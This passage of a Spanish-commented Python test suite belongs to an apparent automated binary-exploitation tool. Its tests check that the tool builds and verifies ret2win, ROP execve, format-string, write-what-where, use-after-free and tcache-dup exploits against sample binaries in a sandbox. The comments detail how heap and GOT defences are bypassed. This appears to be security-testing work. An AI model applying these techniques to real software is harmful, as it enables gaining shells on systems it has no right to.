    assert "prctl" in html and "capset" in html and "getcap" in html  # nota honesta, no decodifica el bitmask

    class _EmptyTriage:
        sections = []
    with patch("os.getxattr", return_value=b"\x01" * 8, create=True):
        res_xattr = _elf_capabilities_check(str(f), _EmptyTriage())
    assert res_xattr == {"xattr_size": 8}
    assert "security.capability" in _elf_capabilities_html(res_xattr, "es")

    assert _elf_capabilities_check(str(f), _EmptyTriage()) == {}
    assert _elf_capabilities_html({}, "es") == ""


def test_references_cites_real_clickable_sources_for_pe_features():
    # Feedback del usuario: la seccion de Referencias solo mostraba comandos de RAG interno
    # ("binoracle kb ...") y nombres de repo sueltos sin enlace -- pidio fuentes REALES (teoria
    # usada, citable). Cada URL de _REF_MAP se verifico con WebFetch antes de anadirla (Microsoft
    # Learn, MITRE ATT&CK, OWASP, GitHub); extra_keys activa las citas de las features PE que
    # SI dispararon en este informe concreto (no toda la tabla solo por ser un PE).
    from binoracle.report.html import _references

    html_full = _references([], "es", extra_keys=[
        "dll_hijack", "pe_mitigations", "msi_rollback", "owasp_desktop", "authenticode"])
    for domain in ("learn.microsoft.com", "attack.mitre.org", "owasp.org"):
        assert domain in html_full
    assert html_full.count("<a href=") >= 5  # cada fuente es un link real, no texto suelto
    assert 'target="_blank"' in html_full

    # sin extra_keys y sin findings que matcheen: no se citan fuentes PE que no aplican a este informe
    html_none = _references([], "es", extra_keys=[])
    assert "learn.microsoft.com" not in html_none and "attack.mitre.org" not in html_none

    # los repos existentes (heap/kernel) tambien deben ser enlaces reales ahora, no texto plano
    class _F:
        def __init__(self, t):
            self.title, self.evidence, self.location = t, "", ""
    html_heap = _references([_F("posible heap overflow")], "es")
    assert "github.com/shellphish/how2heap" in html_heap


def test_is_msi_detects_ole_compound_file_signature(tmp_path):
    # Checklist base: "elevacion a SYSTEM via MSI rollback/Config.Msi LPE". Un .msi es Compound
    # File Binary Format (OLE), NO PE/ELF/Mach-O -- r2 no lo entiende. La deteccion es solo la
    # firma OLE estandar (8 bytes, documentada, sin ambiguedad), independiente de lo que r2 haya
    # podido sacar (que sera basura para este formato).
    from binoracle.report.html import _is_msi

    msi_like = tmp_path / "installer.msi"
    msi_like.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64)
    assert _is_msi(str(msi_like)) is True

    not_msi = tmp_path / "app.exe"
    not_msi.write_bytes(b"MZ" + b"\x00" * 64)
    assert _is_msi(str(not_msi)) is False

    assert _is_msi(str(tmp_path / "does_not_exist")) is False


def test_msi_recon_extracts_summary_metadata_without_guessing_rollback():
    # Se extraen los metadatos OLE estandar (SummaryInformation: titulo, autor, plantilla...) via
    # la libreria olefile, pero DELIBERADAMENTE no se decodifica la tabla Property (DISABLEROLLBACK)
    # -- eso requeriria implementar el formato binario de fila/columna de las tablas MSI, que no se
    # puede verificar sin un fichero MSI real de referencia. El informe debe decir esto
    # explicitamente (Fase 5: no afirmar un hecho de seguridad que no se puede verificar).
    try:
        import olefile  # noqa: F401  (optional '[msi]' extra; skip if not installed)
    except ImportError:
        return
    from unittest.mock import patch, MagicMock
    from binoracle.report.html import _msi_recon, _msi_recon_html

    fake_meta = MagicMock()
    fake_meta.title = "Installer Package"
    fake_meta.author = "Contoso Inc"
    fake_meta.subject = None
    fake_meta.comments = None
    fake_meta.template = "x64;1033"
    fake_ole = MagicMock()
    fake_ole.get_metadata.return_value = fake_meta
    fake_ole.listdir.return_value = [["Property"], ["CustomAction"], ["\x05SummaryInformation"]]

    with patch("olefile.OleFileIO", return_value=fake_ole):
        res = _msi_recon("/nonexistent.msi")
    assert res == {"is_msi": True, "title": "Installer Package", "author": "Contoso Inc",
                    "subject": None, "comments": None, "template": "x64;1033", "n_entries": 3}
    fake_ole.close.assert_called_once()

    html = _msi_recon_html(res, "es")
    assert "Contoso Inc" in html and "x64;1033" in html
    assert "DISABLEROLLBACK" in html and "NO verificado" in html

    # olefile no puede parsear el fichero (corrupto): degrada con gracia, no rompe el informe
    with patch("olefile.OleFileIO", side_effect=OSError("bad file")):
        res_bad = _msi_recon("/nonexistent.msi")
    assert res_bad == {"is_msi": True, "parse_failed": True}
    html_bad = _msi_recon_html(res_bad, "es")
    assert "no se pudo parsear" in html_bad

    assert _msi_recon_html({}, "es") == ""


def test_pe_rich_header_reports_presence_and_entry_count():
    # Gap menor de la Fase 0 ("buscar... el Rich Header... esto determina si vamos a
    # encontrarnos con convenciones MSVC, GCC, Delphi, .NET"): el Rich Header solo lo escribe el
    # linker de Microsoft, asi que su presencia confirma toolchain MSVC. No se decodifica la
    # tabla de product-id -> version de VS (no oficial, propensa a error); solo presencia+conteo.
    from unittest.mock import patch, MagicMock
    from binoracle.report.html import _pe_rich_header, _rich_header_html

    fake_pe = MagicMock()
    # 3 pares (compid, count) = 3 entradas
    fake_pe.parse_rich_header.return_value = {
        "values": [9981587, 2, 10394907, 60, 0, 2],
        "key": b"1234",
    }
    with patch("pefile.PE", return_value=fake_pe):
        res = _pe_rich_header("/nonexistent.exe")
    assert res == {"present": True, "entries": 3}
    html = _rich_header_html(res, "es")
    assert "MSVC" in html and "3" in html

    # sin Rich Header (MinGW/GCC/Delphi/.NET, o eliminado por el linker): nada que informar
    fake_pe_none = MagicMock()
    fake_pe_none.parse_rich_header.return_value = None
    with patch("pefile.PE", return_value=fake_pe_none):
        assert _pe_rich_header("/nonexistent.exe") == {}
    assert _rich_header_html({}, "es") == ""


def test_pe_sibling_dll_signing_flags_dlls_without_authenticode(tmp_path):
    # Checklist base ("¿Y sus DLLs?" -- la firma no solo se comprueba en el EXE principal): DLLs
    # en el mismo directorio que el ejecutable sin tabla de certificados Authenticode.
    from unittest.mock import patch, MagicMock
    import os
    import pefile
    from binoracle.report.html import _pe_sibling_dll_signing, _sibling_dll_signing_html

    exe = tmp_path / "app.exe"
    exe.write_bytes(b"MZ")
    (tmp_path / "signed.dll").write_bytes(b"MZ")
    (tmp_path / "unsigned.dll").write_bytes(b"MZ")

    sec_idx = pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_SECURITY"]

    def _fake_pe(path, fast_load=True):
        pe = MagicMock()
        dd = [MagicMock() for _ in range(20)]
        for d in dd:
            d.VirtualAddress = 0
            d.Size = 0
        # ojo: "unsigned.dll" contiene "signed.dll" como substring -> comparar el basename exacto
        if os.path.basename(str(path)) == "signed.dll":
            dd[sec_idx].VirtualAddress = 0x1000
            dd[sec_idx].Size = 0x200
        pe.OPTIONAL_HEADER.DATA_DIRECTORY = dd
        return pe

    with patch("pefile.PE", side_effect=_fake_pe):
        res = _pe_sibling_dll_signing(str(exe))
    assert res == {"unsigned_dlls": ["unsigned.dll"], "total": 2}
    html = _sibling_dll_signing_html(res, "es")
    assert "unsigned.dll" in html and "signed.dll" not in html.split("Authenticode")[1].split("<p")[0]

    # sin DLLs junto al ejecutable: nada que informar
    only_exe = tmp_path / "solo"
    only_exe.mkdir()
    (only_exe / "app.exe").write_bytes(b"MZ")
    assert _pe_sibling_dll_signing(str(only_exe / "app.exe")) == {}
    assert _sibling_dll_signing_html({}, "es") == ""


def test_pe_sandbox_flag_check_detects_no_sandbox_string():
    # Checklist base ("ejecucion sin sandboxing en componentes de terceros... se identifica al
    # detectar '--no-sandbox' en el comando ejecutado"): busca el literal en las strings (izz).
    from unittest.mock import patch
    from binoracle.report.html import _pe_sandbox_flag_check, _sandbox_flag_html

    class _FakeR2:
        def __init__(self, txt): self.txt = txt
        def cmd(self, c):
            return self.txt if c == "izz" else ""

    r2_electron = _FakeR2("0x1000 20 20 --no-sandbox\n0x1010 12 12 libcef.dll\n")
    with patch("binoracle.oracles.r2session.get", return_value=r2_electron):
        res = _pe_sandbox_flag_check("/nonexistent")
    assert res == {"found": True, "electron": True}
    html = _sandbox_flag_html(res, "es")
    assert "no-sandbox" in html and "Electron" in html

    r2_no_flag = _FakeR2("0x1000 10 10 hello world\n")
    with patch("binoracle.oracles.r2session.get", return_value=r2_no_flag):
        assert _pe_sandbox_flag_check("/nonexistent") == {}
    assert _sandbox_flag_html({}, "es") == ""


def test_rop_binsh_search_uses_real_null_byte():
    # Regresion: build_rop_chain buscaba b"/bin/sh\\x00" (doble barra invertida en el fuente ->
    # los 4 caracteres LITERALES '\','x','0','0', NO un byte nulo) en la libc proporcionada para
    # la estrategia 3 (ret2libc con --libc). Como ninguna libc real contiene ese texto literal, la
    # busqueda SIEMPRE fallaba y el offset de /bin/sh salia como '??' aunque la libc si tuviera el
    # string real. Se verifica con un mock que captura los bytes EXACTOS pasados a libc.search().
    import sys
    import types
    from unittest.mock import MagicMock, patch

    captured = {}

    class _FakeLibc:
        def __init__(self, *a, **k): pass
        def search(self, pattern):
            captured["pattern"] = pattern
            return iter([])                # simula que no se encuentra (no afecta la asercion)
        symbols = {"system": 0x1234}

    class _FakeElf:
        def __init__(self, *a, **k):
            self.pie = True; self.nx = True; self.plt = {}; self.symbols = {}
        def search(self, pattern):
            return iter([])                 # el binario no tiene '/bin/sh' -> fuerza estrategia 3

    fake_pwn = types.SimpleNamespace(
        context=MagicMock(arch="amd64", binary=None),
        ELF=lambda path, **k: _FakeLibc() if "libc" in str(path) else _FakeElf(),
        ROP=lambda elf: MagicMock())
    with patch.dict(sys.modules, {"pwn": fake_pwn}):
        import importlib
        from binoracle.workflows import rop as rop_mod
        importlib.reload(rop_mod)
        try:
            rop_mod.build_rop_chain("/fake/binary", goal="auto", libc_path="/fake/libc.so.6")
        finally:
            importlib.reload(rop_mod)   # restaura el modulo real (pwntools de verdad) para el resto
    assert captured.get("pattern") == b"/bin/sh\x00", (
        f"se busco {captured.get('pattern')!r} en vez del string real con byte nulo")


def test_chainanalyzer_facts_finds_binsh_in_izzj_list_format():
    # Regresion CRITICA (encontrada investigando ropme_pie por peticion del usuario): _facts()
    # parseaba `izzj` como json.loads(...).get("strings", []) -- pero izzj devuelve una lista JSON
    # DIRECTA ([{...}, ...]), no {"strings": [...]}. Llamar .get() sobre una lista lanza
    # AttributeError, capturado por el `except Exception: pass` que envuelve TODO el bloque, asi
    # que f["binsh"] JAMAS se establecia para NINGUN binario, sistematicamente -- no solo
    # ropme_pie. Confirmado con un binario real (ropme_pie) que SI tiene "/bin/sh" en .data
    # (viene de `char binsh[] = "/bin/sh";` en el fuente, para el reto ret2syscall), pero
    # _facts() nunca lo veia, asi que la cadena execve syscall salia con el requisito
    # "cadena '/bin/sh'" marcado [X] incluso estando presente.
    import os
    b = "samples/bin/ropme_pie"
    if not os.path.exists(b):
        return
    from binoracle.workflows.chainanalyzer import _facts
    f = _facts(b)
    assert f.get("binsh") is not None, "binsh no detectado pese a estar presente en .data"


def test_chainanalyzer_attempts_verify_on_pie_despite_pie_breakpoint():
    # Regresion CRITICA (misma familia que el hallazgo del heap): autopie.py's autopie_ret2win()
    # already WORKED standalone against a real PIE binary (resolves the ASLR-off sandbox base, no
    # leak needed), but analyze_chains() gated verification attempts on c.feasible, which requires
    # ZERO break_points -- and _mitig_breakpoints() always adds a PIE break_point ('addresses are
    # random, the chain breaks without a leak') to any PIE binary's ret2win/ret2libc/execve chain,
    # even though the PIE-aware verifier specifically does not need a leak. So _verify_chain() was
    # NEVER invoked for ANY PIE binary, regardless of budget, even though the working verifier was
    # one function call away. Fixed with _should_attempt_verify(): gate on unmet requirements only
    # (canary still blocks the attempt -- no driver bypasses it by brute force).
    import os
    import shutil
    b = "samples/bin/ret2win_pie"
    if not os.path.exists(b) or not shutil.which("docker"):
        return
    from binoracle.workflows.chainanalyzer import analyze_chains
    an = analyze_chains(b, None, verify=True, lang="es")
    ret2win = next(c for c in an.chains if c.name == "ret2win")
    assert ret2win.unmet_requirements == 0
    assert ret2win.verified, ret2win.sim_result
    assert ret2win.proof.get("strategy") == "ret2win-pie"
    # el canary SI debe seguir bloqueando el intento (no hay bypass de canary en los drivers)
    b2 = "samples/bin/canary"
    if os.path.exists(b2):
        an2 = analyze_chains(b2, None, verify=True, lang="es")
        c2 = next(c for c in an2.chains if c.name == "ret2win")
        assert c2.sim_result in ("no simulada", "not simulated"), c2.sim_result


def test_find_win_resolves_gift_function_in_stripped_binary():
    # Nueva capacidad (user-requested: ret2win.stripped): find_win() solo buscaba el simbolo
    # 'win' por NOMBRE (_GIFT_RE sobre afl), asi que en un binario stripped (sin nombres de
    # funcion locales) nunca lo encontraba, aunque la funcion gift siga presente en el codigo.
    # Fix: system/execve/execl NUNCA se stripean (son imports dinamicos, necesarios para el
    # enlazado) -- se busca la funcion que LOS LLAMA (via xref) con un string de shell cerca
    # ('/bin/sh' etc), y se resuelve su direccion de INICIO real (afo), sea o no un simbolo
    # con nombre. Verificado con un binario real: ret2win.stripped ahora resuelve win() en la
    # MISMA direccion (0x401176) que su variante no-stripped, y analyze_chains() VERIFICA el
    # ret2win completo (shell real, uid=0) donde antes se quedaba en 'no se encontro una
    # funcion gift'.
    import os
    b = "samples/bin/ret2win.stripped"
    if not os.path.exists(b):
        return
    from binoracle.workflows.autopoc import find_win
    w = find_win(b)
    # La direccion absoluta de win() depende del compilador (el gcc del host la desplaza unos
    # bytes frente al gcc:13 oficial). La invariante REAL de este test es que el binario stripped
    # resuelve win() en la MISMA direccion que su variante NO stripped (que si conserva el simbolo
    # 'win' y lo resuelve por nombre), independiente del toolchain.
    want = find_win("samples/bin/ret2win")
    assert want is not None, "no se pudo resolver win() en la variante no stripped"
    assert w == want, f"win stripped {hex(w) if w else None} != win no-stripped {hex(want)}"


def test_ret2win_stripped_verifies_end_to_end():
    import os
    import shutil
    b = "samples/bin/ret2win.stripped"
    if not os.path.exists(b) or not shutil.which("docker"):
        return
    from binoracle.workflows.chainanalyzer import analyze_chains
    from binoracle.workflows.autopoc import find_win
    an = analyze_chains(b, None, verify=True, lang="es")
    ret2win = next(c for c in an.chains if c.name == "ret2win")
    assert ret2win.unmet_requirements == 0
    assert ret2win.verified, ret2win.sim_result
    # win() absoluto depende del compilador: se deriva del propio binario en tiempo de test
    # (proof lo guarda como string hex, p.ej. "0x401176") en vez de fijar el literal.
    want = find_win(b)
    assert ret2win.proof.get("win") == hex(want)


def test_ret2win32_verifies_end_to_end():
    # ret2win32 (32 bits, sin PIE) se quedaba SIEMPRE sin verificar por DOS bugs independientes,
    # ninguno de los dos especifico de Docker/qemu:
    #   1) autopoc.py empaquetaba la direccion de retorno con 8 bytes fijos (p64) sin importar
    #      la arquitectura del binario; en un ELF de 32 bits el valor de retorno en pila son 4
    #      bytes, asi que los 4 de mas escriben sobre lo que sigue en la pila y el proceso
    #      termina con SIGSEGV en vez de saltar a win(). Fix: _word_size(binary) via r2 'ij'.
    #   2) el offset devuelto por angr/el metodo estatico (_static_offset, que ademas sumaba +8
    #      fijos en vez de word_size) no coincidia exactamente con el offset real (80 vs 72):
    #      el padding de alineacion del compilador puede desplazarlo por exactamente un word.
    #      Fix: _offset_candidates ahora tambien prueba los vecinos +/- word_size de cada
    #      candidato.
    # Por separado (no cubierto por este test, requiere docker): _docker_run/_docker_run_raw
    # tambien se cambiaron de la imagen gcc:13 (sin libc6:i386) a binoracle-pwn (con soporte
    # i386 anadido a .docker/Dockerfile.pwn), o el proceso de 32 bits ni siquiera arrancaba
    # (qemu-i386: Could not open '/lib/ld-linux.so.2').
    import os
    import shutil
    b = "samples/bin/ret2win32"
    if not os.path.exists(b) or not shutil.which("docker"):
        return
    from binoracle.workflows.chainanalyzer import analyze_chains
    from binoracle.workflows.autopoc import find_win
    an = analyze_chains(b, None, verify=True, lang="es")
    ret2win = next(c for c in an.chains if c.name == "ret2win")
    assert ret2win.unmet_requirements == 0
    assert ret2win.verified, ret2win.sim_result
    # win() absoluto depende del compilador: se deriva del propio binario en tiempo de test
    # (proof lo guarda como string hex, p.ej. "0x80491a6") en vez de fijar el literal.
    want = find_win(b)
    assert ret2win.proof.get("win") == hex(want)


def test_autopoc_word_size_detects_32_vs_64_bit():
    import os
    from binoracle.workflows.autopoc import _word_size
    b32 = "samples/bin/ret2win32"
    b64 = "samples/bin/ret2win"
    if os.path.exists(b32):
        assert _word_size(b32) == 4
    if os.path.exists(b64):
        assert _word_size(b64) == 8


def test_chainanalyzer_ret2csu_detection_uses_cmd_timeout_not_raw_cmd(monkeypatch):
    # Parte del barrido "poco a poco" tras el fix de reachability._sink_callsites:
    # _detect_ret2csu/_find_csu_gadgets usaban r.cmd() crudo (sin timeout) para `is~...` y
    # `pd 48 @ ...` -- mismo riesgo de cuelgue indefinido si r2 se comporta mal con ese comando
    # concreto. Ahora deben pasar por r2session.cmd_timeout, nunca por un r.cmd() directo.
    from binoracle.workflows import chainanalyzer as ca
    from binoracle.oracles import r2session

    calls = []
    def fake_cmd_timeout(binary, cmd, timeout):
        calls.append(cmd)
        if cmd.startswith("is~__libc_csu_init"):
            return "100 0x1000 GLOBAL FUNC 0 __libc_csu_init\n"
        if cmd.startswith("pd 48"):
            return ("0x00401100      5b              pop rbx\n"
                    "0x00401101      5d              pop rbp\n"
                    "0x00401102      415c            pop r12\n"
                    "0x00401104      415d            pop r13\n"
                    "0x00401106      415e            pop r14\n"
                    "0x00401108      415f            pop r15\n"
                    "0x0040110a      c3              ret\n"
                    "0x0040110b      4c89fa          mov rdx, r15\n"
                    "0x0040110e      4c89f6          mov rsi, r14\n"
                    "0x00401111      4489e8          mov edi, r13d\n"
                    "0x00401114      41ff14c4        call [r12+rbx*8]\n")
        return ""
    monkeypatch.setattr(r2session, "cmd_timeout", fake_cmd_timeout)
    monkeypatch.setattr(r2session, "get", lambda binary: object())

    res = ca._detect_ret2csu("fake.bin")
    assert res is not None and res.get("complete") is True
    assert any(c.startswith("is~") for c in calls) and any(c.startswith("pd 48") for c in calls)

    # simbolo ausente -> None SIN intentar pd (evita el `pd @ 0` que puede colgar r2)
    calls.clear()
    monkeypatch.setattr(r2session, "cmd_timeout",
                        lambda binary, cmd, timeout: ("" if cmd.startswith("is~") else
                                                      calls.append(cmd) or "no deberia llegar aqui"))
    res2 = ca._detect_ret2csu("fake.bin")
    assert res2 is None
    assert not calls, "no debe intentar 'pd' cuando el simbolo no existe"


def test_chainanalyzer_wires_up_write_what_where_driver():
    # Nueva capacidad (user-requested: ampliar la cobertura de clases de vulnerabilidad
    # detectadas/verificadas): oobwrite.c tiene un write-what-where real ('table[idx] = val' sin
    # comprobar idx) que ningun chain type previo cubria (no es overflow lineal de pila, no es
    # heap-UAF). Construido y verificado con shell real en el sandbox: sin PIE, el offset entre
    # el array global y una entrada GOT (puts) es ESTATICO, asi que 'idx' se calcula sin ninguna
    # fuga y sobrescribe esa entrada con win(); el propio binario llama a esa funcion justo
    # despues (puts("ok")), disparando el exploit.
    import os
    import shutil
    b = "samples/bin/oobwrite"
    if not os.path.exists(b) or not shutil.which("docker"):
        return
    from binoracle.workflows.chainanalyzer import analyze_chains
    an = analyze_chains(b, None, verify=True, lang="es")
    wow = next((c for c in an.chains if c.name == "write-what-where"), None)
    assert wow is not None, "no se construyo la cadena write-what-where (wow_ok debia ser True)"
    assert wow.verified, wow.sim_result
    assert wow.proof.get("offset") == -12


def test_facts_corrects_canary_false_positive_on_static_binaries():
    # BUG real (no un limite fundamental): `canary` de `ij` es un flag DEL BINARIO ENTERO. En un
    # binario estaticamente enlazado, __stack_chk_fail viaja siempre dentro de la libc completa
    # aunque NINGUNA funcion propia lo use, asi que r2 marcaba canary=True incluso cuando vuln()
    # no comprueba nada -- confirmado leyendo el desensamblado real de vuln() en los 4 binarios de
    # abajo (sus fuentes dicen explicitamente "no canary" y no hay ningun `fs:0x28`/stack_chk ahi).
    # Esto bloqueaba SIEMPRE su verificacion via _should_attempt_verify() (que rechaza canary=True
    # sin condiciones), pese a que un simple ret2win/ROP era perfectamente viable. `canary` y
    # `ret2win_hardened` (canary real, confirmado con `mov rax, qword fs:[0x28]` en su vuln())
    # deben seguir dando True: la correccion solo debe activarse para el falso positivo.
    import os
    from binoracle.workflows.chainanalyzer import _facts
    real_canary = {"samples/bin/canary": True, "samples/bin/ret2win_hardened": True}
    false_positive = {"samples/bin/ropme": False, "samples/bin/ropme_pie": False,
                       "samples/bin/srop": False, "samples/bin/staticrop": False}
    for b, expected in {**real_canary, **false_positive}.items():
        if not os.path.exists(b):
            continue
        f = _facts(b)
        assert f.get("canary") is expected, f"{b}: canary esperado {expected}, obtenido {f.get('canary')}"


def test_ropme_and_srop_verify_end_to_end_after_canary_fix():
    # Consecuencia directa del fix de arriba: antes de esto, ropme y srop NUNCA intentaban
    # verificarse (canary=True los bloqueaba en la puerta), pese a no tener canary real y tener
    # todos los gadgets necesarios para una cadena execve('/bin/sh') por syscall.
    import os
    import shutil
    from binoracle.workflows.chainanalyzer import analyze_chains
    for b in ("samples/bin/ropme", "samples/bin/srop"):
        if not os.path.exists(b) or not shutil.which("docker"):
            continue
        an = analyze_chains(b, None, verify=True, lang="es")
        execve = next((c for c in an.chains if c.name == "execve syscall"), None)
        assert execve is not None
        assert execve.verified, f"{b}: {execve.sim_result}"


def test_ropme_pie_verifies_with_retries_under_flaky_base_resolution():
    # ropme_pie es static-PIE. En este sandbox (Docker Desktop en Apple Silicon), un binario
    # static-PIE se traduce via Rosetta en vez de qemu-user, y resolve_base() (io.libs() /
    # /proc/pid/maps) solo atrapa la direccion real de carga en una VENTANA DE TIEMPO
    # intermitente -- confirmado probando la MISMA logica de resolucion muchas veces seguidas:
    # a veces encuentra la base real (y el exploit funciona con shell real, uid=0), a veces solo
    # ve el propio wrapper de Rosetta y usa el fallback fijo (que no es la base real, y el
    # syscall chain revienta el proceso de inmediato). El offset correcto (72, confirmado via
    # r2) YA estaba primero en la lista de offsets probados -- el problema nunca fue el offset,
    # sino que cada offset solo se intentaba con UNA resolucion de base. El fix (RETRIES por
    # offset en _DRIVER_ROP/_DRIVER en autopie.py) sube las probabilidades de atrapar la ventana
    # buena sin cambiar la logica de resolucion en si.
    import os
    import shutil
    from binoracle.workflows.chainanalyzer import analyze_chains
    b = "samples/bin/ropme_pie"
    if not os.path.exists(b) or not shutil.which("docker"):
        return
    an = analyze_chains(b, None, verify=True, lang="es")
    execve = next((c for c in an.chains if c.name == "execve syscall"), None)
    assert execve is not None
    assert execve.verified, execve.sim_result
    assert execve.proof.get("offset") == 72


def test_chainanalyzer_wires_up_tcache_dup_driver():
    # Nueva capacidad: notes_heap.c corre bajo glibc >= 2.34 (sin __free_hook/__malloc_hook) y
    # no tiene win()/system() en el binario -- ninguna de las tecnicas de heap previas (tcache
    # tcache-poison via autoheap.py, uaf funcptr-hijack via autouaf.py) aplica, ambas requieren
    # win(). La UNICA defensa activa contra el double-free es el campo `key` aleatorizado de
    # tcache; con una escritura UAF (edit sobre indice ya liberado) basta con corromperlo con
    # CUALQUIER valor para saltarsela -- no hace falta conocer su valor real. El envenenamiento
    # del puntero 'next' (safe-linking, XOR contra la propia direccion del campo) se calcula sin
    # ninguna fuga porque el sandbox corre con ASLR desactivado. La UNICA comprobacion real que
    # glibc sigue haciendo sobre la direccion envenenada es que este alineada a 16 bytes
    # ("malloc(): unaligned tcache chunk detected" si no) -- NO que el contenido en direccion-8
    # parezca un tamano de chunk valido (confirmado empiricamente: apuntar a atoi@GOT, que NO
    # esta alineado, aborta con ese mensaje exacto; apuntar a free@GOT, que SI esta alineado,
    # funciona sin comprobacion de tamano). Con free@GOT retargeteada a system() (resuelto desde
    # la libc local del sandbox), la propia operacion free() del binario sobre una nota cuyo
    # CONTENIDO es '/bin/sh' se convierte en system('/bin/sh') = shell real.
    import os
    import shutil
    b = "samples/bin/notes_heap"
    if not os.path.exists(b) or not shutil.which("docker"):
        return
    from binoracle.workflows.chainanalyzer import analyze_chains
    an = analyze_chains(b, None, verify=True, lang="es")
    tcd = next((c for c in an.chains if c.name == "tcache dup"), None)
    assert tcd is not None, "no se construyo la cadena tcache dup (tcache_dup_ok debia ser True)"
    assert tcd.verified, tcd.sim_result
    assert tcd.proof.get("got_symbol") == "free"
    assert tcd.proof.get("got") == "0x404000"


def test_autotcachedup_excludes_binaries_with_win():
    # heapexp/uaf ya tienen win() y su propia tecnica mas directa (tcache-poison / funcptr
    # hijack); la cadena tcache_dup NO debe intentarse ahi (evita atacar un binario con una
    # tecnica pensada para el caso "sin gift function" cuando ya hay una mas simple disponible).
    import os
    from binoracle.workflows.autotcachedup import _tcache_dup_applicable
    for b in ("samples/bin/heapexp", "samples/bin/uaf"):
        if os.path.exists(b):
            assert _tcache_dup_applicable(b) is False


def test_chainanalyzer_wires_up_uaf_funcptr_hijack_driver():
    # Nueva capacidad: uaf.c tiene un UAF real (free() no anula el puntero) donde un malloc
    # posterior del MISMO tamano recicla el chunk liberado (tcache LIFO, sin doble-free ni fake
    # chunk) y la struct reciclada empieza con un puntero a funcion. Tecnica DISTINTA de la ya
    # cubierta por uaf_tcache/autoheap.py (esa necesita fabricar un chunk falso en free@GOT). El
    # menu (numeros de opcion) se reconoce dinamicamente por las cadenas del binario, no esta
    # cableado al protocolo concreto de este sample (1)new 2)free 3)run 4)note).
    import os
    import shutil
    b = "samples/bin/uaf"
    if not os.path.exists(b) or not shutil.which("docker"):
        return
    from binoracle.workflows.chainanalyzer import analyze_chains
    from binoracle.workflows.autopoc import find_win
    an = analyze_chains(b, None, verify=True, lang="es")
    uaf = next((c for c in an.chains if c.name == "uaf funcptr-hijack"), None)
    assert uaf is not None, "no se construyo la cadena uaf funcptr-hijack (uaf_fnptr_ok debia ser True)"
    assert uaf.verified, uaf.sim_result
    # win() absoluto depende del compilador: se deriva del propio binario en tiempo de test
    # (proof lo guarda como string hex, p.ej. "0x4011dc") en vez de fijar el literal.
    want = find_win(b)
    assert uaf.proof.get("win") == hex(want)


def test_chainanalyzer_wires_up_format_string_driver():
    # Nueva capacidad (misma linea de trabajo que write-what-where: ampliar clases de
    # vulnerabilidad cubiertas). autofmt.py YA EXISTIA completo (offset via %N$p, resolucion de
    # system() desde la libc local del sandbox, fmtstr_payload sobre printf@GOT) y funcionaba
    # standalone (autofmt('samples/bin/fmtstring') -> verified=True) pero no tenia NINGUNA
    # referencia en chainanalyzer.py: no habia hecho ('printf' en _facts), ni cadena, ni rama en
    # _verify_chain. fmtstring.c no llama a system() ni tiene win(): el exploit retarget-ea
    # printf@GOT a system usando la libc local (misma logica que ret2libc con leak, pero sin
    # necesitar ninguna fuga real porque estamos verificando en sandbox controlado) y la propia
    # siguiente llamada a printf(buf) del programa se convierte en system(buf).
    import os
    import shutil
    b = "samples/bin/fmtstring"
    if not os.path.exists(b) or not shutil.which("docker"):
        return
    from binoracle.workflows.chainanalyzer import analyze_chains
    an = analyze_chains(b, None, verify=True, lang="es")
    fmt = next((c for c in an.chains if c.name == "format-string"), None)
    assert fmt is not None, "no se construyo la cadena format-string (printf debia estar importado)"
    assert fmt.verified, fmt.sim_result
    assert fmt.proof.get("offset") == 6


def test_chainanalyzer_format_string_driver_handles_pie():
    # Misma cadena que arriba pero sobre la variante PIE: confirma que autofmt.py resuelve
    # correctamente la base de printf@GOT y de system() via io.libs() cuando el binario esta
    # cargado a una direccion aleatorizada, sin depender de ninguna direccion fija.
    import os
    import shutil
    b = "samples/bin/fmtstring_pie"
    if not os.path.exists(b) or not shutil.which("docker"):
        return
    from binoracle.workflows.chainanalyzer import analyze_chains
    an = analyze_chains(b, None, verify=True, lang="es")
    fmt = next((c for c in an.chains if c.name == "format-string"), None)
    assert fmt is not None, "no se construyo la cadena format-string (printf debia estar importado)"
    assert fmt.verified, fmt.sim_result


def test_chainanalyzer_wires_up_working_heap_driver():
    # Regresion CRITICA: autoheap.py's autoheap_shell() (tcache-poison -> free@GOT=win, full
    # sandbox exploit) already existed and WORKED standalone -- verified directly against
    # samples/bin/heapexp returns verified=True -- but analyze_chains() (the function
    # plan_for_binary()/the trainer actually calls) never invoked it at all: classify_binary()
    # correctly tagged these binaries 'uaf', but no chain ever attempted the working driver, so
    # they stayed 'template, not verified' forever regardless of budget (confirmed across 3
    # training runs in this session, all reporting 0/N heap binaries verified).
    import os
    import shutil
    b = "samples/bin/heapexp"
    if not os.path.exists(b) or not shutil.which("docker"):
        return
    from binoracle.workflows.chainanalyzer import analyze_chains
    an = analyze_chains(b, None, verify=True, lang="es")
    heap_chains = [c for c in an.chains if c.name == "uaf tcache-poison"]
    assert heap_chains, "no se construyo la cadena de heap (heap_shell_ok debia ser True)"
    assert heap_chains[0].verified, heap_chains[0].sim_result
    assert "VERIFIED" in (heap_chains[0].proof.get("output") or "")
    assert heap_chains[0].proof.get("free_got") == "0x404000"


def test_cveplan_classify_no_substring_false_positives():
    # Regresion CRITICA: classify_binary() (el clasificador central de clase de vulnerabilidad que
    # decide que tipo de exploit desarrollar) usaba substring sobre el texto crudo de imports:
    # "free" in texto hacia match dentro de "freeaddrinfo" (getaddrinfo/red, nada que ver con
    # free() de memoria), clasificando como 'uaf' un binario que malloc()+usa red pero NUNCA llama
    # a free(). Confirmado con un binario real. Mismo motivo para 'gets' en 'getsockopt' etc.
    from binoracle.workflows.cveplan import classify_binary
    reg = _mock_reg(imports="sym.imp.malloc\nsym.imp.freeaddrinfo\nsym.imp.getaddrinfo")
    assert classify_binary("x", reg=reg) is None, "malloc+freeaddrinfo NO deberia ser 'uaf'"
    reg2 = _mock_reg(imports="sym.imp.getsockopt")
    assert classify_binary("x", reg=reg2) is None, "getsockopt NO deberia ser 'stack-overflow'"
    # true positive: malloc+free REALES si deben marcarse (heap) cuando r2_heap lo confirma
    reg3 = _mock_reg(imports="sym.imp.malloc\nsym.imp.free")
    class _Heap:
        def run(self):
            from binoracle.oracles.base import ToolResult
            return ToolResult(True, "r2", "uaf surface detected")
    orig_get = reg3.get
    reg3.get = lambda n: _Heap() if n == "r2_heap" else orig_get(n)
    assert classify_binary("x", reg=reg3) == "uaf"


def test_cfg_branch_note_no_substring_false_positives():
